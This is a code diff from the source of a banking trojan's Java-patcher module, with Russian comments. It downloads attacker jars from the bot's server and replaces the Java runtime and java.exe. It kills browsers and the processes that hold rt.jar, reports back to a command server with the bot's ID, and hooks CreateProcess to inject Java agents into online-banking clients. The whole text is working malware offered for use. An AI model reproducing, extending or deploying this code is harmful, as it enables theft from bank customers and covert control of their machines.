@@ -104,7 +104,10 @@ static bool GetJavaVersion()
 											javaCompatible = 2;
 									break;
 								case 107: //1.7
-									javaCompatible = 3;
+									if( javaBuild <= 3 )
+										javaCompatible = 3;
+									else
+										javaCompatible = 4;
 									break;
 							}
 							DBG( "JavaPatcher", "java version %d, %d, %d", javaVersion, javaVersion2, javaBuild );
@@ -174,24 +177,27 @@ static bool InitData()
 //возвращает рабочую папу для патчера, и если указано, то добавляем имя файла
 static char* GetWorkFolder( char* path, const char* fileName = 0 )
 {
-	/*
 	pSHGetFolderPathA( 0, CSIDL_COMMON_APPDATA ,  0, 0, path );
 	pPathAppendA( path, "IBank" );
 	if( !Directory::IsExists(path) )
 		if( pCreateDirectoryA( path, 0 ) == 0 ) 
 			return 0;
-	*/
-	GetAllUsersProfile( path, MAX_PATH );
+//	GetAllUsersProfile( path, MAX_PATH );
 	if( fileName )
 		pPathAppendA( path, fileName );
 	return path;
+}
+
+char* GetJavaPatchWorkFolder( char* path, const char* fileName )
+{
+	return GetWorkFolder( path, fileName );
 }
 
 static void SendLogToAdmin( int num )
 {
 	char qr[128];
 	fwsprintfA pwsprintfA = Get_wsprintfA();
-	pwsprintfA( qr, "%sb.php?uid=%s&c=setup_patch&v=%d&jv=%d&botver=%s", domain, BOT_UID, num, javaVersion2, versionPatch  );
+	pwsprintfA( qr, "%sb.php?uid=%s&c=setup_patch&v=%d&jv=%d_%d&botver=%s", domain, BOT_UID, num, javaVersion2, javaBuild, versionPatch  );
 	THTTPResponseRec Response;
 	ClearStruct(Response);
 	HTTP::Get( qr, 0, &Response );
@@ -290,6 +296,7 @@ static bool Patch( const char* userName, const char* tmpRtPath, const char* rtAd
 	pDeleteFileA( ".\\file.dat" );
 	pDeleteFileA( ".\\uid.txt" );
 	pDeleteFileA( ".\\rt2.log" );
+	pDeleteFileA( ".\\PatchFail.txt" );
 
 	if( pCopyFileA( iniFilePath, ".\\rt.ini", FALSE) == 0 )
 		return false;
@@ -416,6 +423,7 @@ static bool DownloadPlugin( FILE_CRC32* filesCrc32, const char* baseUrl, const c
 	for(;;)
 	{
 		DWORD szData;
+		DBG( "JavaPatcher", "Download from: %s", url );
 		char* data = DownloadPlugin( url, &szData, false );
 		if( data )
 		{
@@ -466,11 +474,12 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	{
 		case 1:  addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
 		case 2:  addUrl = "6u18/rt_add.jar"; crcName = "6u18_rt_add.jar"; break;
-		case 3:  addUrl = "7uXX/rt_add.jar"; crcName = "7uXX_rt_add.jar"; break;
+		case 3:  addUrl = "7u00/rt_add.jar"; crcName = "7u00_rt_add.jar"; break;
+		case 4:  addUrl = "7u04/rt_add.jar"; crcName = "7u04_rt_add.jar"; break;
 		default: addUrl = "6u17/rt_add.jar"; crcName = "6u17_rt_add.jar"; break;
 	}
-	File::GetTempName(rtAddFilePath);
-//	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
+//	File::GetTempName(rtAddFilePath);
+	GetWorkFolder( rtAddFilePath, "rt_add.jar" );
 	if( !DownloadPlugin( filesCrc32, baseUrl, addUrl, rtAddFilePath, crcName ) )
 		return false;
 
@@ -547,7 +556,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	if( GetWorkFolder(Path) == 0 )
 		return false;
 
-	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", 0 };//"AgentKP.jar", 0 };
+	const char* miscFiles[] = { "Agent.jar", "AgentPassive.jar", "jni.dll", "client2015.jar", "AgentKP.jar", 0 };
 	const char** ss = miscFiles;
 	while( *ss ) 
 	{
@@ -577,7 +586,7 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	return true;
 }
 
- static bool PatchRtJar( const char* userName, const char* baseUrl, char* libPatch, char* javaExe, char* javaExew )
+ static int PatchRtJar( const char* userName, const char* baseUrl, char* libPatch, char* javaExe, char* javaExew )
 {
 	MemPtr<MAX_PATH> tmpRtPath;
 	pGetTempPathA( tmpRtPath.size(), (char*) tmpRtPath );
@@ -590,11 +599,13 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 
 	MemPtr<MAX_PATH> rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath;
 
-	bool res = false;
+	int res = 1; //не все загрузилось
 	if( DownloadAndSave( baseUrl, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, javaExe, javaExew ) )
 	{
 		if( Patch( userName, tmpRtPath, rtAddFilePath, iniFilePath, iniFilePath2, jarExeFilePath, libPatch ) )
-			res = true;
+			res = 0; //все прошло успешно
+		else
+			res = 2; //все загрузили, но патч не установился
 	}
 	
 	Directory::Delete(tmpRtPath);
@@ -679,7 +690,7 @@ static void GetFileName(HANDLE hFile, PCHAR TheName)
 
  
 
-static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
+static int FindBlockingProcesses( char* FileName, ULONG* PIDs, int c_PIDs )
 {
 	PSYSTEM_HANDLE_INFORMATION Info;
 	ULONG                      r;
@@ -713,9 +724,9 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
 						//DBG( "JavaPatcher", "File busy %s", Name );
 						if( Name[0] != 0 && m_strstr( Name, FileName ) != NULL )
 						{
-							*PIDs = (ULONG*)MemRealloc( *PIDs, (procCount + 1) * sizeof(ULONG) );
-							(*PIDs)[procCount] = Info->aSH[r].uIdProcess;
+							PIDs[procCount] = Info->aSH[r].uIdProcess;
 							procCount++;
+							if( procCount >= c_PIDs ) break;
 						}
 						pCloseHandle(hFile);
 					}
@@ -728,6 +739,23 @@ static int FindBlockingProcesses( char* FileName, ULONG** PIDs )
 	return procCount;
 }
 
+//уничтожает процессы которые держат указанный файл
+static void KillBlockingProcesses( const char* fileName )
+{
+	ULONG PIDS[10];
+
+	int counter = 0; //счетчик попыток уничтожения процессов
+	int countProcess;
+	while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", PIDS, 10 ) ) && counter < 3 )
+	{
+		counter++;
+		while( countProcess-- )
+		{
+			DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
+			KillProcess( PIDS[countProcess], 1000 );
+		};
+	};	
+}
 
 ///////////////////////////////////////////////////////////////////////////////
 HHOOK hMsgBoxHook;
@@ -902,8 +930,8 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 		else
 		{
 			DBG( "JavaPatcher", "not rename %s -> %s", srcJava.str(), dstJava.str() );
-			pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
-			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+			//pMoveFileExA( srcJava.str(), dstJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+			//pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			ret = false;
 		}
 	}
@@ -916,7 +944,7 @@ static bool ReplacementExe(const char* java, const char* javao, const char* java
 		}
 		else //не удалось скопировать, сделаем это после ребута
 		{
-			pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+			//pMoveFileExA( javaExe, srcJava.str(), MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 		}
 	}
 	return ret;
@@ -940,8 +968,6 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 
 	MemPtr<513> user;
 	MemPtr<MAX_PATH> path, javaExe, javaExew;
-	char botUid[100];
-	GenerateUid(botUid);
 
 	PCHAR javaUrl = STR::New( 2, domain, "rt_jar/" );
 
@@ -954,9 +980,10 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 	{
 		char *srcFile, *dstFile;
 		*path.str() = 0;
-		if( PatchRtJar( user, javaUrl, path, javaExe, javaExew ) )
+		int resPatch = PatchRtJar( user, javaUrl, path, javaExe, javaExew );
+		if( resPatch == 0 )
 		{
-			UID_To_File(botUid);
+			UID_To_File(BOT_UID);
 
 			srcFile = user.str();
 			dstFile = path.str();
@@ -965,22 +992,7 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			pPathAppendA( srcFile, "rt2.jar" );
 			pPathAppendA( dstFile, "rt.jar" );
 						
-			ULONG *PIDS = NULL;
-
-			int counter = 0; //счетчик попыток уничтожения процессов
-			int countProcess;
-			while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", &PIDS ) ) && counter < 3 )
-			{
-				counter++;
-				while( countProcess-- )
-				{
-					DBG( "JavaPatcher",  "Killing process %d", PIDS[countProcess] );
-					KillProcess( PIDS[countProcess], 1000 );
-				};
-				MemFree(PIDS);
-				PIDS = 0;
-			};	
-					
+			KillBlockingProcesses("\\lib\\rt.jar");
 			KillAllBrowsers();
 
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
@@ -991,7 +1003,8 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			else
 			{
 				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
-				pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+				resPatch = 3; //не скопировался rt.jar
+				//pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
 			}
 			//Подменяем яву
 			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() );
@@ -1003,13 +1016,24 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			}
 			else //не удалось что-то заменить, делаем перезагрузку
 			{
+				resPatch = 4; //не заменились java.exe и javaw.exe
 				#ifdef KillOs_RebootH
-				SendLogToAdmin(6);
-				Reboot();
+				//SendLogToAdmin(6);
+				//Reboot();
 				#endif
 			}
 		};
 
+		if( resPatch > 0 ) //все файлы загрузились но по какой-то причине не установлся патч
+		{
+			char buf[1];
+			buf[0] = resPatch + '0';
+			//сообщаем что патч не установился
+			GetWorkFolder( path.str(), "PatchFail.txt" );
+			File::WriteBufferA( path.str(), &buf, 1 );
+			KillBlockingProcesses("\\lib\\rt.jar"); //уничтожаем процессы для которых нужно проводить подмену строк
+			KillAllBrowsers(); //уничтожаем все браузеры, чтобы патч работал через хуки
+		}
 	}
 	SendLogToAdmin(5);
 
@@ -1028,25 +1052,27 @@ DWORD WINAPI SendJavaPatchSetupPatch( LPVOID num )
 DWORD WINAPI Run_Path(LPVOID lpData)
 {
 	char testPath[MAX_PATH];
-	if( JavaPatchInstalled() ) return 0; //если патч установлен, то не нужно его повторно ставить
-	if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
-	{
-		while( true )
+	if( !JavaPatchInstalled() ) //если патч не установлен, то ставим
+		if(	GetWorkFolder(testPath, JavaPatcherSignalFile ))
 		{
-			if( File::IsExists(testPath))
+			while( true )
 			{
-				InitData();
-				GetJavaVersion();
-				if( javaCompatible >= 0)
+				if( File::IsExists(testPath))
 				{
-					SendLogToAdmin(1);
-					StartThread( JavaPatch, NULL );
+					InitData();
+					GetJavaVersion();
+					if( javaCompatible >= 0)
+					{
+						SendLogToAdmin(1);
+						StartThread( JavaPatch, NULL );
+					}
+					break;
 				}
-				break;
+				pSleep(5000);
 			}
-			pSleep(5000);
 		}
-	}
+	//если патч был не до конца установлен, то пробуем ставить хуки
+	while( !SetJavaPatcherHook() ) pSleep(5000);
 	return 0;
 }
 
@@ -1159,6 +1185,208 @@ DWORD WINAPI JavaPatcherSignal(LPVOID lpData)
 	return 0;
 }
 
+//////////////////////////////////////////////////////////////////////////
+//работа с патчером через хуки
+//////////////////////////////////////////////////////////////////////////
+
+static BOOL (WINAPI *RealCreateProcA)(LPCSTR,LPSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOA,LPPROCESS_INFORMATION);
+static BOOL (WINAPI *RealCreateProcW)(PWCHAR,PWCHAR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCSTR,LPSTARTUPINFOW,LPPROCESS_INFORMATION);
+
+static bool InsertAfter( char* s, const char* after, const char* ins )
+{
+	char* p = m_strstr( s, after );
+	if( p )
+	{
+		int c_after = m_lstrlen(after);
+		int c_ins = m_lstrlen(ins);
+		int c_s = m_lstrlen(s);
+		char* p1 = s + c_s - 1; //последний символ строки
+		char* p2 = p1 + c_ins; //новая позиция последнего символа строки
+		p += c_after; //куда вставлять
+		while( p1 >= p ) *p2-- = *p1--; //раздвигаем
+		while( c_ins-- > 0 ) *p++ = *ins++; //вставляем в освободившееся место
+		return true;
+	}
+	else
+		return false;
+}
+
+static bool ReplaceInstead( char* s, const char* src, const char* dst )
+{
+	char* p = m_strstr( s, src );
+	if( p )
+	{
+		int c_s = m_lstrlen(s);
+		int c_src = m_lstrlen(src);
+		int c_dst = m_lstrlen(dst);
+		if( c_src > c_dst )
+		{
+			char* p1 = p + c_dst;
+			char* p2 = p + c_src;
+			char* end = s + c_s;
+			while( p2 < end ) *p1++ = *p2++;
+		}
+		else
+		{
+			char* p1 = s + c_s - 1; //последний символ строки
+			char* p2 = p1 + c_dst - c_src; //новая позиция последнего символа строки
+			char* end = p + c_src;
+			while( p1 >= end ) *p2-- = *p1--;
+		}
+		while( c_dst-- > 0 ) *p++ = *dst++;
+		return true;
+	}
+	else
+		return false;
+}
+
+static char* UpdateJavaCmdLine( const char* cmd )
+{
+	int javaExe = 0; //1 - java.exe, 2 - javaw.exe
+	if( m_strstr( cmd, "java.exe" ) )
+		javaExe = 1;
+	else 
+		if( m_strstr( cmd, "javaw.exe" ) )
+			javaExe = 2;
+	DBG( "JavaPatcher", "Type java: %d", javaExe );
+	if( javaExe == 0 ) return 0;
+	char path[MAX_PATH];
+	if( GetWorkFolder( path, 0 ) == 0 ) return 0;
+	int lenPath = m_lstrlen(path);
+	char* ret = STR::Alloc(1024);
+	bool res = false; //результат замены
+	m_lstrcpy( ret, cmd );
+	fwsprintfA pwsprintfA = Get_wsprintfA();
+	if( javaExe == 1 ) //java.exe
+	{
+		char *after1, *after2;
+		MemPtr<1024> insert1, insert2;
+		m_lstrcat( path, "\\passive.dat" );
+		if( File::IsExists(path) )
+		{
+			path[lenPath] = 0;
+			after1 = "-Dsun.awt.warmup=true";
+			pwsprintfA( insert1.str(), " -Xbootclasspath/p:\"%s\\rt_add.jar\" -javaagent:\"%s\\AgentPassive.jar\" ", path, path );
+			after2 = "-Xbootclasspath/a:";
+			pwsprintfA( insert2.str(), "\"%s\\AgentPassive.jar\";\"%s\\lib\\javassist.jar\";", path, path );
+		}
+		else
+		{
+			path[lenPath] = 0;
+			after1 = "-Xbootclasspath/a:";
+			pwsprintfA( insert1.str(), "\"%s\\lib\\javassist.jar\";\"%s\\Agent.jar\";", path, path );
+			after2 = "-Dsun.awt.warmup=true";
+			pwsprintfA( insert2.str(), " -Xbootclasspath/p:\"%s\\rt_add.jar\" -javaagent:\"%s\\Agent.jar\" ", path, path );
+		}
+		res = InsertAfter( ret, after1, insert1 );
+		res &= InsertAfter( ret, after2, insert2 );
+	}
+	else //javaw.exe
+	{
+		char *after1, *replaceSrc;
+		MemPtr<1024> insert1, replaceDst;
+		m_lstrcat( path, "\\active.dat" );
+		if( File::IsExists(path) )
+		{
+			path[lenPath] = 0;
+			after1 = "-Xmx256m -cp launcher.jar";
+			pwsprintfA( insert1.str(), ";\"%s\\lib\\javassist.jar\";\"%s\\Agent.jar\";firmware.jar;sinker-swing.jar; "
+				"-Xbootclasspath/p:\"%s\\rt_add.jar\" -javaagent:\"%s\\Agent.jar\" ", path, path, path, path );
+			res = InsertAfter( ret, after1, insert1 );
+		}
+		else
+		{
+			path[lenPath] = 0;
+			after1 = "-Xmx256m -cp launcher.jar";
+			pwsprintfA( insert1.str(), ";\"%s\\AgentPassive.jar\";\"%s\\lib\\javassist.jar\";firmware.jar;sinker-swing.jar; "
+				"-Xbootclasspath/p:\"%s\\rt_add.jar\" -javaagent:\"%s\\AgentPassive.jar\"", path, path, path, path );
+			res = InsertAfter( ret, after1, insert1 );
+			
+			replaceSrc = "-jar phoenix.jar";
+			pwsprintfA( replaceDst.str(), "-Xmx256m -javaagent:\"%s\\AgentKP.jar\" -cp \"%s\\AgentKP.jar\";\"%s\\lib\\javassist.jar\";"
+				"phoenix.jar com.creditpilot.phoenix.util.Main", path, path, path );
+			//замена не всегда может сработать, поэтому если вставка after1 сработала, то все ок
+			res |= ReplaceInstead( ret, replaceSrc, replaceDst );
+		}
+	}
+	if( !res )
+	{
+		STR::Free(ret);
+		ret = 0;
+	}
+	return ret;
+}
+
+static BOOL WINAPI HookCreateProcessA( PCHAR lpApplicationName, PCHAR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
+        LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
+        LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
+{
+	DBG( "JavaPatcher", "CreateProcessA" );
+	DBG( "JavaPatcher", "CmdLine before: '%s'", lpCommandLine );
+	char* cmdLine = UpdateJavaCmdLine(lpCommandLine);
+	if( cmdLine == 0 ) cmdLine = lpCommandLine;
+	DBG( "JavaPatcher", "CmdLine after: '%s'", cmdLine );
+	BOOL ret = RealCreateProcA( lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, 
+					dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation );
+	if( cmdLine != lpCommandLine )
+		STR::Free(cmdLine);
+	return ret;
+}
+
+static BOOL WINAPI HookCreateProcessW( PWCHAR lpApplicationName, PWCHAR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes,
+        LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment,
+        LPCSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation )
+{
+	DBG( "JavaPatcher", "CreateProcessW" );
+	char* ansiCmd = WSTR::ToAnsi( lpCommandLine, 0 );
+	PWCHAR cmdLine = 0;
+	if( ansiCmd )
+	{
+		DBG( "JavaPatcher", "CmdLine before: '%s'", ansiCmd );
+		char* cmdLineAnsi = UpdateJavaCmdLine(ansiCmd);
+		DBG( "JavaPatcher", "CmdLine after: '%s'", cmdLineAnsi );
+		cmdLine = AnsiToUnicode( cmdLineAnsi, 0 );
+		STR::Free(cmdLineAnsi);
+	}
+	if( cmdLine == 0 ) cmdLine = lpCommandLine;
+	BOOL ret = RealCreateProcW( lpApplicationName, cmdLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles,
+					dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation );
+	if( cmdLine != lpCommandLine )
+		MemFree(cmdLine);
+
+	return ret;
+}
+
+bool SetJavaPatcherHook()
+{
+	DBG( "JavaPatcher", "Установка хуков" );
+	char fileName[MAX_PATH];
+	GetWorkFolder( fileName, "PatchFail.txt" );
+	DWORD szFile;
+	LPBYTE data = File::ReadToBufferA( fileName, szFile );
+	int resPatcher = 0;
+	if( data )
+	{
+		resPatcher = data[0] - '0';
+		MemFree(data);
+	}
+	DBG( "JavaPatcher", "resPatcher = %d", resPatcher );
+	bool ret = false;
+	if( resPatcher > 1 ) 
+	{
+		if (!HookApi( DLL_KERNEL32, 0x46318AC7, &HookCreateProcessA, &RealCreateProcA ) ) return false;
+		if (!HookApi( DLL_KERNEL32, 0x46318AD1, &HookCreateProcessW, &RealCreateProcW ) ) return false;
+		UID_To_File(BOT_UID);
+		DBG( "JavaPatcher", "Хуки установлены" );
+		ret = true;
+	}
+	else
+	{
+		if( resPatcher == 1 ) ret = true; //патч был не полностью скачен, значит ставить хуки бесполезно, поэтому говорим об успешности
+		DBG( "JavaPatcher", "Хуки не нужно ставить" );
+	}
+	return ret;
+}
 
 //----------------------------------------------------------------------------
 //#endif
